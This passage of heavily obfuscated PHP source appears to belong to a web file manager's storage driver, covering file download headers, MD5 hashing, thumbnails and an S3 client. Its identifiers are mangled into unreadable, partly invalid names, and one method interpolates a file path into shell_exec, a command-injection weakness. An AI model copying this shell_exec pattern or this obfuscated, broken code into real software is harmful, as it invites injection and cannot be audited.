$b•ùß‘·¹ = intval($aÂ¹ŠŒÎîÆ / $EñêèñÁ»›); $e ñ£ÌŒá¥ = $díµŞ¨ùí[33]; for ($a±ŠäåÛÚÜ = 0; $a±ŠäåÛÚÜ < $EñêèñÁ»›; $a±ŠäåÛÚÜ++) { $e ñ£ÌŒá¥ .= $this->fileSubstr($dÏâƒ…òî©, $b•ùß‘·¹ * $a±ŠäåÛÚÜ, $f‹ƒÄâäåí); } goto dœš¨ Çô¹; dœš¨ Çô¹: $e ñ£ÌŒá¥ .= $this->fileSubstr($dÏâƒ…òî©, $aÂ¹ŠŒÎîÆ - $f‹ƒÄâäåí, $f‹ƒÄâäåí); return md5($e ñ£ÌŒá¥) . $aÂ¹ŠŒÎîÆ; goto f½ºß‡’î; f½ºß‡’î: } public static $md5Cache = array(); public function hashMd5($d“ŒÔÑİ½†) { $d“ŒÔÑİ½† = $this->iconvSystem($d“ŒÔÑİ½†); if (isset(self::$md5Cache[$d“ŒÔÑİ½†])) { return self::$md5Cache[$d“ŒÔÑİ½†]; } self::$md5Cache[$d“ŒÔÑİ½†] = $this->hashMd5Shell($d“ŒÔÑİ½†); if (!self::$md5Cache[$d“ŒÔÑİ½†]) { self::$md5Cache[$d“ŒÔÑİ½†] = @md5_file($d“ŒÔÑİ½†); } return self::$md5Cache[$d“ŒÔÑİ½†]; } private function hashMd5Shell($E«¢¡¢¡‚) { goto Fƒì™©ˆäÍ; E´ï„™‡Šİ: $A±¡•è”‰¯ = Cache::get($e†ë‘·àÇ[100]); if (!$A±¡•è”‰¯) { $cª¸’‘ÁÛ = BASIC_PATH . $e†ë‘·àÇ[101]; $dŞÃŠ´¶î = md5_file($cª¸’‘ÁÛ); $A±¡•è”‰¯ = $e†ë‘·àÇ[102]; foreach ($A–—Ç‰ºÚõ as $døôËó¡¦) { $B–êÍ­Íñ› = shell_exec($døôËó¡¦ . "\40\42{$cª¸’‘ÁÛ}\x22"); if ($B–êÍ­Íñ› && substr(trim($B–êÍ­Íñ›), 0, 32) == $dŞÃŠ´¶î) { $A±¡•è”‰¯ = $døôËó¡¦; break; } } Cache::set($e†ë‘·àÇ[100], $A±¡•è”‰¯, 3600); } if ($A±¡•è”‰¯ == $e†ë‘·àÇ[102]) { return !1; } goto C°¹ÉŠùà«; C°¹ÉŠùà«: $B–êÍ­Íñ› = shell_exec($A±¡•è”‰¯ . "\x20\x22{$E«¢¡¢¡‚}\42"); $B–êÍ­Íñ› = str_replace($e†ë‘·àÇ[103], $e†ë‘·àÇ[33], $B–êÍ­Íñ›); return substr($B–êÍ­Íñ›, 0, 32); goto bñ¦ó˜ŠÛ“; Fƒì™©ˆäÍ: $e†ë‘·àÇ =& $_SERVER[¹Ò‹Ò¹]; if (!function_exists($e†ë‘·àÇ[97])) { return !1; } $A–—Ç‰ºÚõ = array($e†ë‘·àÇ[98], $e†ë‘·àÇ[99]); goto E´ï„™‡Šİ; bñ¦ó˜ŠÛ“: } public function link($b¤³‡çç) { return $b¤³‡çç; } public function fileOut($fì—ù§¹‹, $FĞ·¿‰åãµ = false, $bá¸Àõ‚õµ = false, $b¨–Šî¥ŠÑ = '') { goto cê°´Ü™Æì; dÎá‚¹‡ƒß: if (isset($_SERVER[$C…Ï‰‹Ùáµ[130]]) && strtotime($_SERVER[$C…Ï‰‹Ùáµ[130]]) == $dë†šŠ—”å[$C…Ï‰‹Ùáµ[83]]) { header($C…Ï‰‹Ùáµ[131], !0, 304); die; } if (isset($_SERVER[$C…Ï‰‹Ùáµ[132]]) && $_SERVER[$C…Ï‰‹Ùáµ[132]] == $b¨–Šî¥ŠÑ) { header($C…Ï‰‹Ùáµ[133] . $b¨–Šî¥ŠÑ, !0, 304); die; } header($C…Ï‰‹Ùáµ[133] . $b¨–Šî¥ŠÑ); goto aóÅË°’÷‘; Cî¿ÓõŠ·º: header($C…Ï‰‹Ùáµ[137] . $c‚¯äÏ¡Œõ); header($C…Ï‰‹Ùáµ[138]); if (!$FĞ·¿‰åãµ && $eƒ£ÄÖÚ == $C…Ï‰‹Ùáµ[139]) { if ($c‚¯äÏ¡Œõ > 1024 * 1024 * 5) { die; } $F±öÍî¤¤Ã = $this->getContent($fì—ù§¹‹); $F±öÍî¤¤Ã = Html::clearSVG($F±öÍî¤¤Ã); header($C…Ï‰‹Ùáµ[140] . strlen($F±öÍî¤¤Ã)); echo $F±öÍî¤¤Ã; die; } goto cÆ„çš‹†³; BƒÖ‹¼ÒĞ: @ob_end_clean(); set_timeout(); $dë†šŠ—”å = $this->infoFull($fì—ù§¹‹); goto a“ˆˆÂ˜ÏË; Bã¿»Ñ­Â‘: $B¶‚ÏÄ°½¹ = $C…Ï‰‹Ùáµ[115] . $B¶‚ÏÄ°½¹ . $C…Ï‰‹Ùáµ[121] . $B¶‚ÏÄ°½¹; if ($FĞ·¿‰åãµ) { header($C…Ï‰‹Ùáµ[122]); header($C…Ï‰‹Ùáµ[123] . $B¶‚ÏÄ°½¹); } else { header($C…Ï‰‹Ùáµ[124] . $B¶‚ÏÄ°½¹); } header($C…Ï‰‹Ùáµ[125] . gmdate($C…Ï‰‹Ùáµ[109], time() + 3600 * 24 * 30) . $C…Ï‰‹Ùáµ[126]); goto aŸ†è’İƒ’; añ‡Ÿ–ä‘ä: header($C…Ï‰‹Ùáµ[119]); header($C…Ï‰‹Ùáµ[120] . $C‘â¸›×”ƒ); $B¶‚ÏÄ°½¹ = rawurlencode($E¹ğ°š»Èœ); goto Bã¿»Ñ­Â‘; a²ß¯î„›£: $Eíùñ§›Ô  = !0; if ($_SERVER[$C…Ï‰‹Ùáµ[153]] == $C…Ï‰‹Ùáµ[154] && $c‚¯äÏ¡Œõ > 1204 * 1024 * 1024 * 2) { $Eíùñ§›Ô  = !1; } if ($Eíùñ§›Ô ) { header($C…Ï‰‹Ùáµ[155] . ($a…£œˆÙ¢ - $Fñä¥á”–ó + 1)); } goto BªíÍ¥ˆ•Û; eÏÔòÉÊîÖ: if ($dßÇ´•ÔÓŒ) { $Aå×¨ç´‚ª = intval(1000 * 1000 * ($Cšİ‡¶Ú¿Á / $dßÇ´•ÔÓŒ)); } while ($Fñä¥á”–ó <= $a…£œˆÙ¢) { $DéŞ½­˜© = timeFloat(); check_abort(); $f…Œ°ä² = $a…£œˆÙ¢ - $Fñä¥á”–ó + 1; if ($f…Œ°ä² <= $Cšİ‡¶Ú¿Á) { $Cšİ‡¶Ú¿Á = $f…Œ°ä²; } echo $this->fileSubstr($fì—ù§¹‹, $Fñä¥á”–ó, $Cšİ‡¶Ú¿Á); $Fñä¥á”–ó += $Cšİ‡¶Ú¿Á; if ($Cšİ‡¶Ú¿Á == $f…Œ°ä²) { $Fñä¥á”–ó = $a…£œˆÙ¢ + 1; } if ($Aå×¨ç´‚ª) { $B¯‰‹ÎÃë = intval(1000 * 1000 * (timeFloat() - $DéŞ½­˜©)); $f’Ÿ’õ½¶Â = $Aå×¨ç´‚ª - $B¯‰‹ÎÃë; if ($f’Ÿ’õ½¶Â > 5) { usleep($f’Ÿ’õ½¶Â); } } } goto A¯Äëäß˜Ö; aŸ†è’İƒ’: header($C…Ï‰‹Ùáµ[127]); header($C…Ï‰‹Ùáµ[128]); header($C…Ï‰‹Ùáµ[129]); goto dÎá‚¹‡ƒß; aóÅË°’÷‘: header($C…Ï‰‹Ùáµ[134] . $C³²‘ÑÒ™• . $C…Ï‰‹Ùáµ[126]); header($C…Ï‰‹Ùáµ[135] . $E¹ğ°š»Èœ); header($C…Ï‰‹Ùáµ[136]); goto Cî¿ÓõŠ·º; BªíÍ¥ˆ•Û: if ($_SERVER[$C…Ï‰‹Ùáµ[156]] == $C…Ï‰‹Ùáµ[157]) { return; } $Cšİ‡¶Ú¿Á = 1024 * 100; $Aå×¨ç´‚ª = 0; goto eÏÔòÉÊîÖ; cê°´Ü™Æì: $C…Ï‰‹Ùáµ =& $_SERVER[¹Ò‹Ò¹]; $this->cacheMethod(null, null); if (!$fì—ù§¹‹ || !$this->exist($fì—ù§¹‹)) { show_json(LNG($C…Ï‰‹Ùáµ[104]), !1, $bá¸Àõ‚õµ); } goto A™Ş‚‰È¶Š; AÒáìŒØ‡¯: $Fñä¥á”–ó = 0; $a…£œˆÙ¢ = $c‚¯äÏ¡Œõ - 1; $eƒ£ÄÖÚ = $this->ext($E¹ğ°š»Èœ); goto fóá´Ç­²; d™¦©ã¬÷ƒ: $C‘â¸›×”ƒ = get_file_mime($eƒ£ÄÖÚ); if (strstr($C‘â¸›×”ƒ, $C…Ï‰‹Ùáµ[116])) { $C‘â¸›×”ƒ = $C‘â¸›×”ƒ . $C…Ï‰‹Ùáµ[117]; } if ($FĞ·¿‰åãµ === !1 && !mime_support($C‘â¸›×”ƒ)) { $FĞ·¿‰åãµ = !0; $C‘â¸›×”ƒ = $C…Ï‰‹Ùáµ[118]; } goto añ‡Ÿ–ä‘ä; fóá´Ç­²: if (in_array($eƒ£ÄÖÚ, array($C…Ï‰‹Ùáµ[110], $C…Ï‰‹Ùáµ[111], $C…Ï‰‹Ùáµ[112], $C…Ï‰‹Ùáµ[113]))) { $eƒ£ÄÖÚ = $C…Ï‰‹Ùáµ[114]; } if (!$b¨–Šî¥ŠÑ) { $b¨–Šî¥ŠÑ = md5($C³²‘ÑÒ™• . $this->hashSimple($fì—ù§¹‹)); } $b¨–Šî¥ŠÑ = $C…Ï‰‹Ùáµ[115] . $b¨–Šî¥ŠÑ . $C…Ï‰‹Ùáµ[115]; goto d™¦©ã¬÷ƒ; A™Ş‚‰È¶Š: $Cù·³ğ© = $this->getType() == $C…Ï‰‹Ùáµ[105]; $B“ô¤†ï‰ğ = $GLOBALS[$C…Ï‰‹Ùáµ[6]][$C…Ï‰‹Ùáµ[87]][$C…Ï‰‹Ùáµ[106]][$C…Ï‰‹Ùáµ[107]]; $dßÇ´•ÔÓŒ = (double) $GLOBALS[$C…Ï‰‹Ùáµ[6]][$C…Ï‰‹Ùáµ[87]][$C…Ï‰‹Ùáµ[106]][$C…Ï‰‹Ùáµ[108]] * 1024 * 1024; goto BƒÖ‹¼ÒĞ; cÆ„çš‹†³: $d—áİ…«ã = strtolower($_SERVER[$C…Ï‰‹Ùáµ[141]]); if ($Cù·³ğ© && $d—áİ…«ã && $B“ô¤†ï‰ğ) { if (strstr($d—áİ…«ã, $C…Ï‰‹Ùáµ[142])) { header($C…Ï‰‹Ùáµ[143] . $fì—ù§¹‹); } else { if (strstr($d—áİ…«ã, $C…Ï‰‹Ùáµ[144])) { header($C…Ï‰‹Ùáµ[145] . $fì—ù§¹‹); } else { if (strstr($d—áİ…«ã, $C…Ï‰‹Ùáµ[146])) { header($C…Ï‰‹Ùáµ[147] . $fì—ù§¹‹); } } } if ($dßÇ´•ÔÓŒ) { header($C…Ï‰‹Ùáµ[148] . $dßÇ´•ÔÓŒ); } return; } if (isset($_SERVER[$C…Ï‰‹Ùáµ[149]])) { if (preg_match($C…Ï‰‹Ùáµ[150], $_SERVER[$C…Ï‰‹Ùáµ[149]], $aÜÎ‡ìÔÉ³)) { $Fñä¥á”–ó = intval($aÜÎ‡ìÔÉ³[1]); if (!empty($aÜÎ‡ìÔÉ³[2])) { $a…£œˆÙ¢ = intval($aÜÎ‡ìÔÉ³[2]); } } header($C…Ï‰‹Ùáµ[151]); header("\103\157\156\x74\x65\156\x74\x2d\x52\x61\156\147\x65\x3a\x20\142\171\x74\x65\163\40{$Fñä¥á”–ó}\55{$a…£œˆÙ¢}\57" . $c‚¯äÏ¡Œõ); } else { header($C…Ï‰‹Ùáµ[152]); } goto a²ß¯î„›£; a“ˆˆÂ˜ÏË: $c‚¯äÏ¡Œõ = $dë†šŠ—”å[$C…Ï‰‹Ùáµ[77]]; $C³²‘ÑÒ™• = gmdate($C…Ï‰‹Ùáµ[109], $dë†šŠ—”å[$C…Ï‰‹Ùáµ[83]]); $E¹ğ°š»Èœ = $bá¸Àõ‚õµ ? $bá¸Àõ‚õµ : $this->iconvApp($dë†šŠ—”å[$C…Ï‰‹Ùáµ[28]]); goto AÒáìŒØ‡¯; A¯Äëäß˜Ö: } public function fileOutServer($c¢†õ¬¤¼…, $Eë…Ÿ×İÈ = false, $Cƒ¯ÉÃÙÑ = false, $f È«§¦ç‚ = '') { $this->fileOut($c¢†õ¬¤¼…, $Eë…Ÿ×İÈ, $Cƒ¯ÉÃÙÑ, $f È«§¦ç‚); } public function fileOutLink($dÛ³×–ìÊ) { header($_SERVER[¹Ò‹Ò¹][158] . $dÛ³×–ìÊ); die; } public function cacheMethod($eØ¶õ¾‰†Ä, $d—ÌÕíŸ, $D¾£ê¥Áß¥ = null) { goto bµÁàŸĞÆˆ; dŒ¬Á› Ë™: if (!is_null($D¾£ê¥Áß¥)) { $aİ¬Í‰–½¹[$c•™öµˆ–ğ] = $D¾£ê¥Áß¥; return; } $e§ËŞÚğŠˆ = isset($aİ¬Í‰–½¹[$c•™öµˆ–ğ]) ? $aİ¬Í‰–½¹[$c•™öµˆ–ğ] : null; if (!is_null($e§ËŞÚğŠˆ)) { return $e§ËŞÚğŠˆ; } goto EÒ«ÁŒ„”„; EÒ«ÁŒ„”„: $e§ËŞÚğŠˆ = $this->{$eØ¶õ¾‰†Ä}($d—ÌÕíŸ); $aİ¬Í‰–½¹[$c•™öµˆ–ğ] = $e§ËŞÚğŠˆ; return $e§ËŞÚğŠˆ; goto D‹‡£Íëà; AãëäôĞªˆ: $c•™öµˆ–ğ = $dè×„Óõ¶ì[159] . $eØ¶õ¾‰†Ä . $dè×„Óõ¶ì[160] . rtrim($AïŒöé‘Õ, $dè×„Óõ¶ì[8]); if (is_null($eØ¶õ¾‰†Ä)) { $aİ¬Í‰–½¹ = array(); return; } if (is_null($d—ÌÕíŸ)) { unset($aİ¬Í‰–½¹[$c•™öµˆ–ğ]); return; } goto dŒ¬Á› Ë™; bµÁàŸĞÆˆ: $dè×„Óõ¶ì =& $_SERVER[¹Ò‹Ò¹]; static $aİ¬Í‰–½¹ = array(); $AïŒöé‘Õ = $d—ÌÕíŸ ? ltrim($this->getPathOuter($d—ÌÕíŸ), $dè×„Óõ¶ì[8]) : $d—ÌÕíŸ; goto AãëäôĞªˆ; D‹‡£Íëà: } public function fileOutImage($FÁÙà¾¢”, $eˆºÂÔ Õ¹ = 250) { goto e”½–îİê; dôö¥˜—: if (!file_exists($d•¬Ï•íö) || filesize($d•¬Ï•íö) < 100) { return @file_exists($eéäÈà˜âö) ? IO::fileOut($eéäÈà˜âö) : $this->fileOut($FÁÙà¾¢”); } if (!($Bà¶†—Øø = IO::move($d•¬Ï•íö, $D„±®£‹ÑĞ))) { return IO::fileOut($d•¬Ï•íö); } del_file($d•¬Ï•íö); goto FÚÒš‡©Â÷; A…‰ƒäø¸½: if (!($C£Õî¹ªµŞ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $aÃ»‘†¯¾[171]))) { $D„±®£‹ÑĞ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $aÃ»‘†¯¾[172]); } else { $D„±®£‹ÑĞ = KodIO::make($C£Õî¹ªµŞ); } if ($C£Õî¹ªµŞ = IO::fileNameExist($D„±®£‹ÑĞ, $AÇñ¾’êØ)) { $d•¬Ï•íö = KodIO::make($C£Õî¹ªµŞ); return IO::fileOut($d•¬Ï•íö, !1, $DÈ¤ñÓš„); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto Dèâ†É´ƒ; Dèâ†É´ƒ: $d•¬Ï•íö = DATA_THUMB . $AÇñ¾’êØ; del_file($d•¬Ï•íö); if (!@file_exists($d•¬Ï•íö)) { $c®Àª·¹îğ = TEMP_FILES; if (!is_dir($c®Àª·¹îğ)) { mk_dir($c®Àª·¹îğ); } $eéäÈà˜âö = $c®Àª·¹îğ . $d“§†ÂÂ . $aÃ»‘†¯¾[94] . $c¤Øçßòë[$aÃ»‘†¯¾[167]]; if (!@file_exists($eéäÈà˜âö)) { $eéäÈà˜âö = $this->download($FÁÙà¾¢”, $eéäÈà˜âö); } ImageThumb::createThumb($eéäÈà˜âö, $d•¬Ï•íö, $eˆºÂÔ Õ¹, $eˆºÂÔ Õ¹ * 10); } goto dôö¥˜—; DÃ«ÊéõˆÉ: $DÈ¤ñÓš„ = $c¤Øçßòë[$aÃ»‘†¯¾[28]]; $BÆÈ¡‰ä¬ó = !1; if (isset($GLOBALS[$aÃ»‘†¯¾[161]]) && $GLOBALS[$aÃ»‘†¯¾[161]][$aÃ»‘†¯¾[75]] == $c¤Øçßòë[$aÃ»‘†¯¾[75]]) { $Cœô§„É£³ = $GLOBALS[$aÃ»‘†¯¾[161]][$aÃ»‘†¯¾[162]]; if (!$c¤Øçßòë[$aÃ»‘†¯¾[163]]) { $c¤Øçßòë[$aÃ»‘†¯¾[163]] = $GLOBALS[$aÃ»‘†¯¾[161]]; } if (isset($Cœô§„É£³[$aÃ»‘†¯¾[164]])) { if ($Cœô§„É£³[$aÃ»‘†¯¾[164]] <= $eˆºÂÔ Õ¹ && $Cœô§„É£³[$aÃ»‘†¯¾[165]] <= $eˆºÂÔ Õ¹) { $BÆÈ¡‰ä¬ó = !0; } } $DÈ¤ñÓš„ = $c¤Øçßòë[$aÃ»‘†¯¾[163]][$aÃ»‘†¯¾[28]]; } goto EËøõ™›³; EËøõ™›³: if ($c¤Øçßòë[$aÃ»‘†¯¾[77]] <= 1024 * 50 || $BÆÈ¡‰ä¬ó || !function_exists($aÃ»‘†¯¾[166]) || $c¤Øçßòë[$aÃ»‘†¯¾[167]] == $aÃ»‘†¯¾[168]) { return $this->fileOut($FÁÙà¾¢”, !1, $DÈ¤ñÓš„); } if (isset($c¤Øçßòë[$aÃ»‘†¯¾[163]][$aÃ»‘†¯¾[169]])) { $d“§†ÂÂ = $c¤Øçßòë[$aÃ»‘†¯¾[163]][$aÃ»‘†¯¾[169]]; } else { if (isset($c¤Øçßòë[$aÃ»‘†¯¾[163]][$aÃ»‘†¯¾[170]])) { $d“§†ÂÂ = $c¤Øçßòë[$aÃ»‘†¯¾[163]][$aÃ»‘†¯¾[170]]; } else { $d“§†ÂÂ = md5("{$c¤Øçßòë[$aÃ»‘†¯¾[28]]}\137{$c¤Øçßòë[$aÃ»‘†¯¾[75]]}\137{$c¤Øçßòë[$aÃ»‘†¯¾[77]]}"); } } $AÇñ¾’êØ = "{$d“§†ÂÂ}\137{$eˆºÂÔ Õ¹}\56\160\156\147"; goto A…‰ƒäø¸½; FÚÒš‡©Â÷: IO::fileOut($Bà¶†—Øø); goto d“Çæó‰¹—; e”½–îİê: $aÃ»‘†¯¾ =& $_SERVER[¹Ò‹Ò¹]; if (substr($FÁÙà¾¢”, 0, 4) == $aÃ»‘†¯¾[146]) { $this->fileOutLink($FÁÙà¾¢”); } $c¤Øçßòë = $this->info($FÁÙà¾¢”); goto DÃ«ÊéõˆÉ; d“Çæó‰¹—: } public function fileOutImageServer($fÒÓåñ¨·, $bŠ‘Š¢ˆ Î = 250) { $this->fileOutImage($fÒÓåñ¨·, $bŠ‘Š¢ˆ Î); } public function fileNameAuto($E„§æÖ™Â­, $DÒï›õÓˆÖ, $FØ„ç‹¬¤° = REPEAT_RENAME, $Cö¢ë«íš¸ = false) { goto FĞŠåÎÈ¬ã; Eò¦–´ÖÎ…: if ($FØ„ç‹¬¤° == REPEAT_SKIP) { return !1; } $DÄ„¼âÚ¤ = $a§½‡‹Û»¼[94] . get_path_ext($DÒï›õÓˆÖ); $DÄ„¼âÚ¤ = $DÄ„¼âÚ¤ == $a§½‡‹Û»¼[94] || $Cö¢ë«íš¸ ? $a§½‡‹Û»¼[33] : $DÄ„¼âÚ¤; goto fÊ†Í©òÂé; FĞŠåÎÈ¬ã: $a§½‡‹Û»¼ =& $_SERVER[¹Ò‹Ò¹]; $a¡™äà»± = $E„§æÖ™Â­ === $a§½‡‹Û»¼[33] ? $DÒï›õÓˆÖ : rtrim($E„§æÖ™Â­, $a§½‡‹Û»¼[8]) . $a§½‡‹Û»¼[8] . $DÒï›õÓˆÖ; if ($FØ„ç‹¬¤° == REPEAT_REPLACE || !$this->exist($a¡™äà»±) || $Cö¢ë«íš¸ && $FØ„ç‹¬¤° != REPEAT_RENAME_FOLDER) { return $DÒï›õÓˆÖ; } goto Eò¦–´ÖÎ…; B—í±ó‹¾É: while ($this->exist(rtrim($E„§æÖ™Â­, $a§½‡‹Û»¼[8]) . $a§½‡‹Û»¼[8] . $C„îğ²í)) { $C„îğ²í = $Eè‰±‰Î‚³ . "\50{$DœñˆÚ³í}\51{$DÄ„¼âÚ¤}"; $DœñˆÚ³í++; } return $C„îğ²í; goto FáİÔÂ“§„; fÊ†Í©òÂé: $DœñˆÚ³í = 1; $Eè‰±‰Î‚³ = substr($DÒï›õÓˆÖ, 0, strlen($DÒï›õÓˆÖ) - strlen($DÄ„¼âÚ¤)); $C„îğ²í = $Eè‰±‰Î‚³ . "\x28{$DœñˆÚ³í}\51{$DÄ„¼âÚ¤}"; goto B—í±ó‹¾É; FáİÔÂ“§„: } private function fileNameAutoList($AŞÑ‡Ÿ»§¡, $b¢¬‰“åíÄ, $eĞôï‘¨Éá = false) { goto eö†•°ÑÏÎ; eö†•°ÑÏÎ: $b»ÃÔ‹‹—³ =& $_SERVER[¹Ò‹Ò¹]; $AéùíÎè…ì = $this->listPath($AŞÑ‡Ÿ»§¡, !0); $AéùíÎè…ì = array_merge($AéùíÎè…ì[$b»ÃÔ‹‹—³[74]], $AéùíÎè…ì[$b»ÃÔ‹‹—³[73]]); goto A”¹ÇÄè…«; eá¯“÷Éí: return $C¼×±ˆÁµ; goto F”»–Á¡®È; A”¹ÇÄè…«: $dÙ»Ò¬Õ†Ü = array_to_keyvalue($AéùíÎè…ì, $b»ÃÔ‹‹—³[33], $b»ÃÔ‹‹—³[28]); $d°§ƒóŠºš = $b»ÃÔ‹‹—³[94] . get_path_ext($b¢¬‰“åíÄ); $d°§ƒóŠºš = $d°§ƒóŠºš == $b»ÃÔ‹‹—³[94] || $eĞôï‘¨Éá ? $b»ÃÔ‹‹—³[33] : $d°§ƒóŠºš; goto b…Ù…ÏÒ; b…Ù…ÏÒ: $aõ‰—Üêˆ = substr($b¢¬‰“åíÄ, 0, strlen($b¢¬‰“åíÄ) - strlen($d°§ƒóŠºš)); $C¼×±ˆÁµ = $aõ‰—Üêˆ . "\50\60\51{$d°§ƒóŠºš}"; for ($f‹öù–ßÕ£ = 1; $f‹öù–ßÕ£ <= count($dÙ»Ò¬Õ†Ü) + 1; $f‹öù–ßÕ£++) { $C¼×±ˆÁµ = $aõ‰—Üêˆ . "\x28{$f‹öù–ßÕ£}\x29{$d°§ƒóŠºš}"; if (!in_array_not_case($C¼×±ˆÁµ, $dÙ»Ò¬Õ†Ü)) { return $C¼×±ˆÁµ; } } goto eá¯“÷Éí; F”»–Á¡®È: } public function listAllFiles($a‹£ËãæÈ½, $eëŞÊ±ÚõÉ, $e˜„Ü„Úæ¤ = array()) { goto AÏ®ä³‰¬Š; AÏ®ä³‰¬Š: $d–µš´‚¶ =& $_SERVER[¹Ò‹Ò¹]; if (empty($eëŞÊ±ÚõÉ)) { return array(); } $dŸ´ÙâÍ‘… = array(); goto aµ¢ïÇìÖº; aµ¢ïÇìÖº: $a‹£ËãæÈ½ = trim($a‹£ËãæÈ½, $d–µš´‚¶[8]); foreach ($eëŞÊ±ÚõÉ as $DĞ§Ñ±¾¨é) { $cë†ĞÙŸº³ = ltrim(substr(trim($DĞ§Ñ±¾¨é, $d–µš´‚¶[8]), strlen($a‹£ËãæÈ½)), $d–µš´‚¶[8]); $dŸ´ÙâÍ‘… = array_merge($dŸ´ÙâÍ‘…, $this->slicePath($cë†ĞÙŸº³)); } $D‰Œñ÷íó‡ = array(); goto eÌäƒ…Ú; eÌäƒ…Ú: foreach (array_unique($dŸ´ÙâÍ‘…) as $DĞ§Ñ±¾¨é) { $c§Ğ¢ä’Çï = array($d–µš´‚¶[75] => $this->getPathOuter($d–µš´‚¶[8] . $a‹£ËãæÈ½ . $d–µš´‚¶[8] . $DĞ§Ñ±¾¨é), $d–µš´‚¶[76] => 1, $d–µš´‚¶[77] => 0); if (substr($DĞ§Ñ±¾¨é, -1) != $d–µš´‚¶[8]) { $c§Ğ¢ä’Çï[$d–µš´‚¶[76]] = 0; $b¹éŸÔ’×º = $this->getPath($a‹£ËãæÈ½ . $d–µš´‚¶[8] . $DĞ§Ñ±¾¨é); $c§Ğ¢ä’Çï[$d–µš´‚¶[77]] = isset($e˜„Ü„Úæ¤[$b¹éŸÔ’×º]) ? $e˜„Ü„Úæ¤[$b¹éŸÔ’×º] : $this->size($b¹éŸÔ’×º); } $D‰Œñ÷íó‡[] = $c§Ğ¢ä’Çï; } return $D‰Œñ÷íó‡; goto FŠÜæ¸ÚëÉ; FŠÜæ¸ÚëÉ: } public function slicePath($fØ¼àÉ·±Á) { $C‘¬‘†Ö–Ç =& $_SERVER[¹Ò‹Ò¹]; $d«È¡ºĞŒ = explode($C‘¬‘†Ö–Ç[8], trim($fØ¼àÉ·±Á, $C‘¬‘†Ö–Ç[8])); $døÙØ¿ÅÒ = 0; do { ++$døÙØ¿ÅÒ; $c›Ïïã²¦Š[] = implode($C‘¬‘†Ö–Ç[8], array_slice($d«È¡ºĞŒ, 0, $døÙØ¿ÅÒ)) . $C‘¬‘†Ö–Ç[8]; } while ($døÙØ¿ÅÒ < count($d«È¡ºĞŒ)); $c›Ïïã²¦Š[count($d«È¡ºĞŒ) - 1] = $fØ¼àÉ·±Á; return $c›Ïïã²¦Š; } public function getHost() { $B÷Ğ‰¦ù¯ =& $_SERVER[¹Ò‹Ò¹]; $a«îéõˆ‚¹ = parse_url(trim($this->domain, $B÷Ğ‰¦ù¯[8])); $D—Š‚·§ = isset($a«îéõˆ‚¹[$B÷Ğ‰¦ù¯[173]]) ? $a«îéõˆ‚¹[$B÷Ğ‰¦ù¯[173]] : http_type(); $CØò±¼ôá = isset($a«îéõˆ‚¹[$B÷Ğ‰¦ù¯[174]]) ? $a«îéõˆ‚¹[$B÷Ğ‰¦ù¯[174]] : $a«îéõˆ‚¹[$B÷Ğ‰¦ù¯[75]]; if (isset($a«îéõˆ‚¹[$B÷Ğ‰¦ù¯[175]])) { $CØò±¼ôá .= $B÷Ğ‰¦ù¯[4] . $a«îéõˆ‚¹[$B÷Ğ‰¦ù¯[175]]; } return $D—Š‚·§ . $B÷Ğ‰¦ù¯[176] . $CØò±¼ôá; } public function pathEncode($a—º®¢è±) { $eÇ‡ìè½Ñ =& $_SERVER[¹Ò‹Ò¹]; return str_replace($eÇ‡ìè½Ñ[177], $eÇ‡ìè½Ñ[8], rawurlencode($a—º®¢è±)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($E¡§ÚÅ„‹å) { set_timeout(); require_once SDK_DIR . $_SERVER[¹Ò‹Ò¹][178]; parent::__construct(); $this->_init($E¡§ÚÅ„‹å); } public function _init($E‹Ìï÷Ä®¤) { foreach ($E‹Ìï÷Ä®¤ as $B‡Øˆ†ÛØ® => $fš§õ‚¶ã¯) { if (isset($this->{$B‡Øˆ†ÛØ®})) { $this->{$B‡Øˆ†ÛØ®} = $fš§õ‚¶ã¯; } } $this->endpoint = $E‹Ìï÷Ä®¤[$_SERVER[¹Ò‹Ò¹][179]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($d¥ã‡°•õø = "\x76\64") { $this->signVer = $d¥ã‡°•õø; $this->client->setSignatureVersion($d¥ã‡°•õø); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto E¾à‰‚ô–›; E¾à‰‚ô–›: $B¾À§É¼Í =& $_SERVER[¹Ò‹Ò¹]; $AÙô¶´»« = $this->getBucketCors(); if (!$AÙô¶´»« || !is_array($AÙô¶´»«)) { return !1; } goto A¦ƒçÚ±Ğï; fµ¸ÜĞ¬“ß: $DŠ»¨ÙÂØˆ = array($B¾À§É¼Í[185], $B¾À§É¼Í[186], $B¾À§É¼Í[187], $B¾À§É¼Í[188], $B¾À§É¼Í[189]); $c×Ê½¯œ†§ = array_diff($DŠ»¨ÙÂØˆ, $B°œƒºİ¥»); return empty($c×Ê½¯œ†§); goto DƒÕô„Âƒ; A¦ƒçÚ±Ğï: if ($AÙô¶´»«[$B¾À§É¼Í[180]] != $B¾À§É¼Í[181] || $AÙô¶´»«[$B¾À§É¼Í[182]] != $B¾À§É¼Í[181]) { return !1; } $B°œƒºİ¥» = array_map($B¾À§É¼Í[183], $AÙô¶´»«[$B¾À§É¼Í[184]]); if (!is_array($B°œƒºİ¥»)) { $B°œƒºİ¥» = array(); } goto fµ¸ÜĞ¬“ß; DƒÕô„Âƒ: } public function mkfile($C™¸´‚º‘Î, $FÉÍ˜“Ò = '', $EÙ–Ã®ç– = REPEAT_RENAME) { $C‰ÔÎ²İ‘¶ = $this->setContent($C™¸´‚º‘Î, $FÉÍ˜“Ò); if ($C‰ÔÎ²İ‘¶ !== !1) { return $this->getPathOuter($C™¸´‚º‘Î); } return !1; } public function mkdir($e‹ÁßêŠ»², $fÈÖßñ÷Í† = REPEAT_SKIP) { if (empty($e‹ÁßêŠ»²)) { return !1; } if ($this->_isFolder($e‹ÁßêŠ»²)) { return $this->getPathOuter($e‹ÁßêŠ»²); } $BÏ¾¢ÁÁ¶º = $this->setContent($e‹ÁßêŠ»², 